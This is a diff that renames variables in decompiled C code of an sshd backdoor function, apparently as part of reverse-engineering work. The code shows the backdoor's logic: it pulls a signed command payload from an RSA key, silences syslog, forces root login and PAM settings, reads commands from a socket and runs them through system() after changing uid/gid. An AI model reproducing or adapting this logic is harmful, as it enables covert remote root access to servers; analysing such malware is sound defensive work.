@@ -19,18 +19,18 @@
 BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
 
 {
-  imported_funcs_t *piVar1;
-  pfn_RSA_get0_key_t ppVar2;
-  pfn_BN_num_bits_t ppVar3;
-  libc_imports_t *plVar4;
-  sensitive_data *psVar5;
-  sshkey **ppsVar6;
-  u8 *puVar7;
-  pfn_setlogmask_t ppVar8;
-  sshd_ctx_t *psVar9;
-  uint *puVar10;
-  long *plVar11;
-  pfn_exit_t ppVar12;
+  imported_funcs_t *imports;
+  pfn_RSA_get0_key_t get_rsa_components;
+  pfn_BN_num_bits_t bn_num_bits;
+  libc_imports_t *libc;
+  sensitive_data *secrets;
+  sshkey **host_keys;
+  u8 *payload_cursor;
+  pfn_setlogmask_t setlogmask_fn;
+  sshd_ctx_t *sshd_ctx;
+  uint *use_pam_ptr;
+  long *mm_answer_slot;
+  pfn_exit_t exit_fn;
   byte bVar13;
   uint uVar14;
   int iVar15;
@@ -108,19 +108,19 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
   }
   if (ctx != (global_context_t *)0x0) {
     if ((((ctx->disable_backdoor == FALSE) && (key != (RSA *)0x0)) &&
-        (piVar1 = ctx->imported_funcs, piVar1 != (imported_funcs_t *)0x0)) &&
-       ((ppVar2 = piVar1->RSA_get0_key, ppVar2 != (pfn_RSA_get0_key_t)0x0 &&
-        (piVar1->BN_bn2bin != (pfn_BN_bn2bin_t)0x0)))) {
+        (imports = ctx->imported_funcs, imports != (imported_funcs_t *)0x0)) &&
+       ((get_rsa_components = imports->RSA_get0_key, get_rsa_components != (pfn_RSA_get0_key_t)0x0 &&
+        (imports->BN_bn2bin != (pfn_BN_bn2bin_t)0x0)))) {
       if (do_orig == (BOOL *)0x0) {
         ctx->disable_backdoor = TRUE;
         return FALSE;
       }
       *do_orig = TRUE;
-      (*ppVar2)(key,(BIGNUM **)&tgt_uid,(BIGNUM **)&tgt_gid,(BIGNUM **)0x0);
+      (*get_rsa_components)(key,(BIGNUM **)&tgt_uid,(BIGNUM **)&tgt_gid,(BIGNUM **)0x0);
       if ((((_tgt_uid != (BIGNUM *)0x0) && (_tgt_gid != (BIGNUM *)0x0)) &&
           ((ctx->imported_funcs != (imported_funcs_t *)0x0 &&
-           (((ppVar3 = ctx->imported_funcs->BN_num_bits, ppVar3 != (pfn_BN_num_bits_t)0x0 &&
-             (uVar14 = (*ppVar3)(_tgt_uid), uVar14 < 0x4001)) &&
+           (((bn_num_bits = ctx->imported_funcs->BN_num_bits, bn_num_bits != (pfn_BN_num_bits_t)0x0 &&
+             (uVar14 = (*bn_num_bits)(_tgt_uid), uVar14 < 0x4001)) &&
             (uVar14 = uVar14 + 7 >> 3, uVar14 - 0x14 < 0x205)))))) &&
          (iVar15 = (*ctx->imported_funcs->BN_bn2bin)(_tgt_uid,local_2e0 + 5), -1 < iVar15)) {
         uVar35 = (ulong)uVar14;
@@ -129,9 +129,9 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
           if (((CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25) == 0) || (uStack_2d7 == 0)) ||
              (uVar27 = (ulong)CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25) * (ulong)uStack_2d7 +
                        lStack_2d3, 3 < uVar27)) goto LAB_0010a11a;
-          plVar4 = ctx->libc_imports;
-          if (((plVar4 != (libc_imports_t *)0x0) && (plVar4->getuid != (pfn_getuid_t)0x0)) &&
-             ((plVar4->exit != (pfn_exit_t)0x0 &&
+          libc = ctx->libc_imports;
+          if (((libc != (libc_imports_t *)0x0) && (libc->getuid != (pfn_getuid_t)0x0)) &&
+             ((libc->exit != (pfn_exit_t)0x0 &&
               ((ctx->sshd_log_ctx != (sshd_log_ctx_t *)0x0 && (ctx->num_shifted_bits == 0x1c8))))))
           {
             local_83 = CONCAT44(uStack_2d7,CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25));
@@ -155,13 +155,13 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
                 *(undefined4 *)ppuVar31 = 0;
                 ppuVar31 = (u8 **)((long)ppuVar31 + (ulong)bVar37 * -8 + 4);
               }
-              psVar5 = ctx->sshd_sensitive_data;
+              secrets = ctx->sshd_sensitive_data;
               piVar21 = &body_size;
               for (lVar23 = 0x29; lVar23 != 0; lVar23 = lVar23 + -1) {
                 *(undefined1 *)piVar21 = 0;
                 piVar21 = (int *)((long)piVar21 + (ulong)bVar37 * -2 + 1);
               }
-              if ((((psVar5 != (sensitive_data *)0x0) && (psVar5->host_pubkeys != (sshkey **)0x0))
+              if ((((secrets != (sensitive_data *)0x0) && (secrets->host_pubkeys != (sshkey **)0x0))
                   && (ctx->imported_funcs != (imported_funcs_t *)0x0)) && (0x71 < uVar35 - 0x10)) {
                 iVar15 = (int)uVar27;
                 *(int *)local_550 = iVar15;
@@ -220,12 +220,12 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
                     puVar32 = (undefined4 *)((long)puVar32 + (ulong)bVar37 * -2 + 1);
                   }
                   stack0xfffffffffffffa60 = 0;
-                  ppsVar6 = psVar5->host_keys;
+                  host_keys = secrets->host_keys;
                   _tmp = 0;
-                  if (((ppsVar6 != (sshkey **)0x0) && (psVar5->host_pubkeys != (sshkey **)0x0)) &&
-                     ((ppsVar6 != psVar5->host_pubkeys &&
-                      (((((uint)psVar5->have_ssh2_key < 2 &&
-                         (BVar16 = count_pointers(ppsVar6,(u64 *)((long)&hostkey_hash_offset + 1),
+                  if (((host_keys != (sshkey **)0x0) && (secrets->host_pubkeys != (sshkey **)0x0)) &&
+                     ((host_keys != secrets->host_pubkeys &&
+                      (((((uint)secrets->have_ssh2_key < 2 &&
+                         (BVar16 = count_pointers(host_keys,(u64 *)((long)&hostkey_hash_offset + 1),
                                                   ctx->libc_imports), BVar16 != FALSE)) &&
                         (BVar16 = count_pointers(ctx->sshd_sensitive_data->host_pubkeys,(u64 *)&tmp,
                                                  ctx->libc_imports),
@@ -255,13 +255,13 @@ LAB_00109aa2:
                           if (uVar26 <= uVar35 - uVar36) {
                             if ((((local_2e0[0] & 4) == 0) ||
                                 (ctx->libc_imports == (libc_imports_t *)0x0)) ||
-                               (ppVar8 = ctx->libc_imports->setlogmask,
-                               ppVar8 == (pfn_setlogmask_t)0x0)) {
+                               (setlogmask_fn = ctx->libc_imports->setlogmask,
+                               setlogmask_fn == (pfn_setlogmask_t)0x0)) {
                               ctx->sshd_log_ctx->syslog_disabled = FALSE;
                               if ((local_2e0[0] & 5) == 5) goto LAB_0010a1ba;
                             }
                             else {
-                              (*ppVar8)(-0x80000000);
+                              (*setlogmask_fn)(-0x80000000);
                               ctx->sshd_log_ctx->syslog_disabled = TRUE;
                             }
                             uVar18 = (*ctx->libc_imports->getuid)();
@@ -303,18 +303,18 @@ LAB_00109c8a:
                                   (ctx->sshd_offsets).field0_0x0.raw_value = uVar14;
                                   puVar29 = (uid_t *)(local_2e0 + uVar36 + 5);
                                   if (uVar18 == 0) {
-                                    plVar4 = ctx->libc_imports;
-                                    if ((((plVar4 != (libc_imports_t *)0x0) &&
-                                         (plVar4->setresgid != (pfn_setresgid_t)0x0)) &&
-                                        (plVar4->setresuid != (pfn_setresuid_t)0x0)) &&
-                                       (plVar4->system != (pfn_system_t)0x0)) {
+                                    libc = ctx->libc_imports;
+                                    if ((((libc != (libc_imports_t *)0x0) &&
+                                         (libc->setresgid != (pfn_setresgid_t)0x0)) &&
+                                        (libc->setresuid != (pfn_setresuid_t)0x0)) &&
+                                       (libc->system != (pfn_system_t)0x0)) {
                                       if (uVar27 == 0) {
-                                        psVar9 = ctx->sshd_ctx;
-                                        if (((psVar9 != (sshd_ctx_t *)0x0) &&
-                                            (psVar9->mm_answer_keyallowed_ptr != (void *)0x0)) &&
-                                           (psVar9->have_mm_answer_keyallowed != FALSE)) {
+                                        sshd_ctx = ctx->sshd_ctx;
+                                        if (((sshd_ctx != (sshd_ctx_t *)0x0) &&
+                                            (sshd_ctx->mm_answer_keyallowed_ptr != (void *)0x0)) &&
+                                           (sshd_ctx->have_mm_answer_keyallowed != FALSE)) {
                                           if ((char)local_2e0[1] < '\0') goto LAB_00109d36;
-                                          piVar21 = psVar9->permit_root_login_ptr;
+                                          piVar21 = sshd_ctx->permit_root_login_ptr;
                                           if (piVar21 != (int *)0x0) {
                                             iVar15 = *piVar21;
                                             if (iVar15 < 3) {
@@ -322,10 +322,10 @@ LAB_00109c8a:
                                                 *piVar21 = 3;
 LAB_00109d36:
                                                 if ((bVar13 & 0x40) != 0) {
-                                                  puVar10 = (uint *)psVar9->use_pam_ptr;
-                                                  if ((puVar10 == (uint *)0x0) || (1 < *puVar10))
+                                                  use_pam_ptr = (uint *)sshd_ctx->use_pam_ptr;
+                                                  if ((use_pam_ptr == (uint *)0x0) || (1 < *use_pam_ptr))
                                                   goto LAB_0010a1ba;
-                                                  *puVar10 = 0;
+                                                  *use_pam_ptr = 0;
                                                 }
                                                 stack0xfffffffffffffa60 =
                                                      CONCAT44(uStack_59c,0xffffffff);
@@ -338,7 +338,7 @@ LAB_00109d36:
                                                   BVar16 = sshd_get_usable_socket
                                                                      ((int *)((long)&
                                                   hostkey_hash_offset + 1),local_2e0[1] >> 3 & 0xf,
-                                                  plVar4);
+                                                  libc);
                                                 }
                                                 if (BVar16 != FALSE) {
                                                   iVar15 = stack0xfffffffffffffa60;
@@ -347,10 +347,10 @@ LAB_00109d36:
                                                   local_590 = 0;
                                                   uStack_588 = 0;
                                                   if (((-1 < stack0xfffffffffffffa60) &&
-                                                      (plVar4 = ctx->libc_imports,
-                                                      plVar4 != (libc_imports_t *)0x0)) &&
-                                                     ((plVar4->pselect != (pfn_pselect_t)0x0 &&
-                                                      (plVar4->__errno_location !=
+                                                      (libc = ctx->libc_imports,
+                                                      libc != (libc_imports_t *)0x0)) &&
+                                                     ((libc->pselect != (pfn_pselect_t)0x0 &&
+                                                      (libc->__errno_location !=
                                                        (pfn___errno_location_t)0x0)))) {
                                                     iVar17 = stack0xfffffffffffffa60 >> 6;
                                                     uVar35 = 1L << ((byte)stack0xfffffffffffffa60 &
@@ -368,7 +368,7 @@ LAB_00109d36:
                                                       *(ulong *)(local_550 + (long)iVar17 * 8) =
                                                            uVar35;
                                                       local_590 = 0;
-                                                      iVar19 = (*plVar4->pselect)(iVar15 + 1,
+                                                      iVar19 = (*libc->pselect)(iVar15 + 1,
                                                                                   (fd_set *)
                                                                                   local_550,
                                                                                   (fd_set *)0x0,
@@ -381,7 +381,7 @@ LAB_00109d36:
                                                             ((uVar35 & *(ulong *)(local_550 +
                                                                                  (long)iVar17 * 8))
                                                              != 0)) &&
-                                                           (sVar22 = fd_read(iVar15,&tmp,4,plVar4),
+                                                           (sVar22 = fd_read(iVar15,&tmp,4,libc),
                                                            -1 < sVar22)) {
                                                           uVar14 = (uint)tmp.field0_0x0 >> 0x18 |
                                                                    ((uint)tmp.field0_0x0 & 0xff0000)
@@ -391,29 +391,29 @@ LAB_00109d36:
                                                           _tmp = CONCAT44(uStack_594,uVar14);
                                                           if ((uVar14 - 1 < 0x41) &&
                                                              (sVar22 = fd_read(iVar15,&
-                                                  hostkey_hash_offset,1,plVar4), -1 < sVar22)) {
+                                                  hostkey_hash_offset,1,libc), -1 < sVar22)) {
                                                     ctx->sock_read_buf_size =
                                                          (ulong)((int)tmp.field0_0x0 - 1);
                                                     sVar22 = fd_read(iVar15,ctx->sock_read_buf,
                                                                      (ulong)((int)tmp.field0_0x0 - 1
-                                                                            ),plVar4);
+                                                                            ),libc);
                                                     if (-1 < sVar22) {
-                                                      psVar9 = ctx->sshd_ctx;
-                                                      if (psVar9->mm_answer_keyallowed !=
+                                                      sshd_ctx = ctx->sshd_ctx;
+                                                      if (sshd_ctx->mm_answer_keyallowed !=
                                                           (void *)0x0) {
-                                                        plVar11 = (long *)psVar9->
+                                                        mm_answer_slot = (long *)sshd_ctx->
                                                   mm_answer_keyallowed_ptr;
                                                   if ((local_2e0[2] & 0x3f) == 0) {
                                                     iVar15 = 0x16;
-                                                    if (plVar11 != (long *)0x0) {
-                                                      iVar15 = (int)plVar11[-1];
+                                                    if (mm_answer_slot != (long *)0x0) {
+                                                      iVar15 = (int)mm_answer_slot[-1];
                                                     }
                                                   }
                                                   else {
                                                     iVar15 = (uint)(local_2e0[2] & 0x3f) * 2;
                                                   }
-                                                  psVar9->mm_answer_keyallowed_reqtype = iVar15 + 1;
-                                                  *plVar11 = (long)psVar9->mm_answer_keyallowed;
+                                                  sshd_ctx->mm_answer_keyallowed_reqtype = iVar15 + 1;
+                                                  *mm_answer_slot = (long)sshd_ctx->mm_answer_keyallowed;
                                                   goto LAB_0010a076;
                                                   }
                                                   }
@@ -421,7 +421,7 @@ LAB_00109d36:
                                                   }
                                                   break;
                                                   }
-                                                  piVar21 = (*plVar4->__errno_location)();
+                                                  piVar21 = (*libc->__errno_location)();
                                                   } while (*piVar21 == 4);
                                                   }
                                                 }
@@ -488,7 +488,7 @@ LAB_0010a076:
 LAB_00109fb9:
                                           if ((((uVar35 <= uVar26) &&
                                                ((rgid == 0 ||
-                                                (iVar15 = (*plVar4->setresgid)(rgid,rgid,rgid),
+                                                (iVar15 = (*libc->setresgid)(rgid,rgid,rgid),
                                                 iVar15 != -1)))) &&
                                               ((uVar18 == 0 ||
                                                (iVar15 = (*ctx->libc_imports->setresuid)
@@ -502,14 +502,14 @@ LAB_00109fb9:
                                         }
                                       }
                                       else if ((((local_2e0[1] & 0xc0) == 0xc0) &&
-                                               (plVar4->exit != (pfn_exit_t)0x0)) &&
-                                              (plVar4->pselect != (pfn_pselect_t)0x0)) {
+                                               (libc->exit != (pfn_exit_t)0x0)) &&
+                                              (libc->pselect != (pfn_pselect_t)0x0)) {
                                         *(cmd_arguments_t **)(local_550 + 8) = (cmd_arguments_t *)0x0;
                                         *(u64 *)local_550 = 5;
-                                        (*plVar4->pselect)(0,(fd_set *)0x0,(fd_set *)0x0,
+                                        (*libc->pselect)(0,(fd_set *)0x0,(fd_set *)0x0,
                                                            (fd_set *)0x0,(timespec *)local_550,
                                                            (sigset_t *)0x0);
-                                        (*plVar4->exit)(0);
+                                        (*libc->exit)(0);
                                       }
                                     }
                                   }
@@ -580,11 +580,11 @@ LAB_0010a1ba:
                           if (ctx->libc_imports == (libc_imports_t *)0x0) {
                             return FALSE;
                           }
-                          ppVar12 = ctx->libc_imports->exit;
-                          if (ppVar12 == (pfn_exit_t)0x0) {
+                          exit_fn = ctx->libc_imports->exit;
+                          if (exit_fn == (pfn_exit_t)0x0) {
                             return FALSE;
                           }
-                          (*ppVar12)(0);
+                          (*exit_fn)(0);
                           return FALSE;
                         }
                         goto LAB_0010a11a;
@@ -604,16 +604,16 @@ LAB_0010a1ba:
                           if (((ctx->current_data_size <= ctx->payload_data_size) &&
                               (uVar20 = ctx->payload_data_size - ctx->current_data_size,
                               0x38 < uVar20)) && (uVar26 <= uVar20 - 0x39)) {
-                            puVar7 = ctx->payload_data;
+                            payload_cursor = ctx->payload_data;
                             uVar20 = 0;
                             do {
-                              puVar7[uVar20] = local_2e0[uVar20 + uVar36 + 5];
+                              payload_cursor[uVar20] = local_2e0[uVar20 + uVar36 + 5];
                               uVar20 = uVar20 + 1;
                             } while (uVar26 != uVar20);
-                            ppsVar6 = ctx->sshd_sensitive_data->host_pubkeys;
+                            host_keys = ctx->sshd_sensitive_data->host_pubkeys;
                             sshkey_digest_offset = ctx->current_data_size + uVar26;
                             ctx->current_data_size = sshkey_digest_offset;
-                            BVar16 = verify_signature(ppsVar6[ctx->sshd_host_pubkey_idx],
+                            BVar16 = verify_signature(host_keys[ctx->sshd_host_pubkey_idx],
                                                       ctx->payload_data,sshkey_digest_offset,
                                                       ctx->payload_data_size,
                                                       auStack_2d9 + uVar26 + uVar36 + -2,
